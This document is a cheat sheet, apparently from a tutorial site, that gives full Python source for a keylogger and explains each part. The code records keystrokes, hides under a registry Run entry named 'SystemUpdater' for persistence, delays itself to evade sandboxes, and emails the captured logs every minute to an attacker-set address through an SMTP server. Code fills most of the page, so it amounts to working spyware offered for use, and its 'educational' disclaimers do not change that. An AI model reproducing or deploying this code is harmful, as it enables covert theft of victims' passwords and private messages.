> ⚠️ **Disclaimer**: This code is for educational purposes only. Use only in a secure, isolated lab environment with proper authorization. Unauthorized use or deployment of malware is illegal and unethical.

# Keylogger Cheat Sheet (For Educational Purposes)

This cheat sheet provides a guide to creating a **Python-based Keylogger**, a type of malware that captures and logs keystrokes on a target machine. The collected data can then be sent to a remote server for analysis.

---

## Keylogger Overview

A **Keylogger** is designed to:
- **Capture Keystrokes**: Record every keystroke made by the target.
- **Store or Send Data**: Log captured data locally or send it to a remote server.
- **Evasion & Persistence**: Stealthily execute in the background and maintain access over time.

---

## Key Features in This Keylogger

1. **Keystroke Capture**: Uses the `pynput` library to monitor and log keystrokes.
2. **Automatic Dependency Installation**: Installs required modules if missing.
3. **Data Exfiltration**: Sends logged keystrokes to a specified email at set intervals.
4. **Persistence Mechanism**: Adds itself to startup to continue logging across reboots.
5. **Anti-Analysis Evasion**: Includes delays to avoid sandbox detection.

---

## Advanced Python Keylogger Code

The code below captures keystrokes, automatically installs dependencies, periodically sends logs via email, and sets up persistence on the target machine.

### Full Keylogger Code

```python
import os
import sys
import time
import threading
import smtplib
import ctypes
import tempfile
import subprocess
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Automatically check and install dependencies
def install_module(module_name):
    try:
        __import__(module_name)
    except ImportError:
        print(f"[*] Installing {module_name} module...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])

# Ensure required modules are installed
install_module("pynput")
from pynput.keyboard import Listener

# Configuration
EMAIL_ADDRESS = "your_email@example.com"   # Replace with attacker's email address
EMAIL_PASSWORD = "your_password"           # Replace with attacker's email password
SEND_INTERVAL = 60  # Interval to send logs in seconds

# Initialize log variable
log = ""

# Anti-sandbox delay
time.sleep(10)

# Function to add persistence
def add_persistence():
    try:
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        value_name = "SystemUpdater"
        keylogger_path = os.path.realpath(sys.argv[0])
        ctypes.windll.advapi32.RegSetValueExW(ctypes.windll.advapi32.HKEY_CURRENT_USER, key, 0, 1, value_name, keylogger_path)
        print("[*] Persistence achieved via registry key.")
    except Exception as e:
        print(f"[!] Failed to add persistence: {e}")

# Keylogger functions
def on_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        elif key == key.enter:
            log += "\n"
        else:
            log += f" [{str(key)}] "

# Function to send email with logs
def send_email(log_data):
    try:
        msg = MIMEMultipart()
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger Log"

        msg.attach(MIMEText(log_data, "plain"))

        # Connect to server and send email
        server = smtplib.SMTP("smtp.example.com", 587)  # Replace with email provider's SMTP server
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, msg.as_string())
        server.quit()
    except Exception as e:
        print(f"[!] Failed to send email: {e}")

# Periodic log sending
def report():
    global log
    while True:
        if log:
            send_email(log)
            log = ""
        time.sleep(SEND_INTERVAL)

# Run keylogger
def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

# Run keylogger and persistence in separate threads
if __name__ == "__main__":
    add_persistence()
    
    # Start email reporting in a separate thread
    report_thread = threading.Thread(target=report)
    report_thread.start()
    
    # Start the keylogger
    start_keylogger()
```

---

## Explanation of Key Components

### 1. **Automatic Dependency Installation**

The `install_module()` function checks if the required modules are installed. If not, it installs them automatically using `pip`.

```python
def install_module(module_name):
    try:
        __import__(module_name)
    except ImportError:
        print(f"[*] Installing {module_name} module...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])
```

### 2. **Keystroke Capture**

Using `pynput`, the keylogger captures each keystroke and stores it in a `log` variable.

```python
def on_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        elif key == key.enter:
            log += "\n"
        else:
            log += f" [{str(key)}] "
```

### 3. **Anti-Sandboxing Delay**

The keylogger waits 10 seconds before starting, which can help evade some sandbox environments that may only monitor activity for a short period.

```python
time.sleep(10)
```

### 4. **Persistence Mechanism**

The keylogger sets itself up as a startup item in the Windows registry. This ensures it runs each time the system boots.

```python
def add_persistence():
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    value_name = "SystemUpdater"
    keylogger_path = os.path.realpath(sys.argv[0])
    ctypes.windll.advapi32.RegSetValueExW(ctypes.windll.advapi32.HKEY_CURRENT_USER, key, 0, 1, value_name, keylogger_path)
```

### 5. **Email Log Exfiltration**

The function `send_email()` sends the contents of the `log` to a specified email address at regular intervals using `smtplib`. The function connects to the email provider's SMTP server to send the log data.

```python
def send_email(log_data):
    msg = MIMEMultipart()
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = EMAIL_ADDRESS
    msg["Subject"] = "Keylogger Log"

    msg.attach(MIMEText(log_data, "plain"))

    # Connect to server and send email
    server = smtplib.SMTP("smtp.example.com", 587)  # Replace with email provider's SMTP server
    server.starttls()
    server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
    server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, msg.as_string())
    server.quit()
```

### 6. **Periodic Reporting**

The `report()` function periodically sends the log contents and clears it, creating a continuous exfiltration loop.

```python
def report():
    global log
    while True:
        if log:
            send_email(log)
            log = ""
        time.sleep(SEND_INTERVAL)
```

### 7. **Multi-Threaded Execution**

The keylogger and email reporting run in separate threads. This ensures the keylogger captures keystrokes continuously while also sending reports at set intervals.

```python
report_thread = threading.Thread(target=report)
report_thread.start()
```

---

## Security and Legal Disclaimer

This keylogger script is strictly for educational purposes and should only be used in a secure, isolated lab environment with proper authorization. Unauthorized use of malware is illegal and unethical.

```
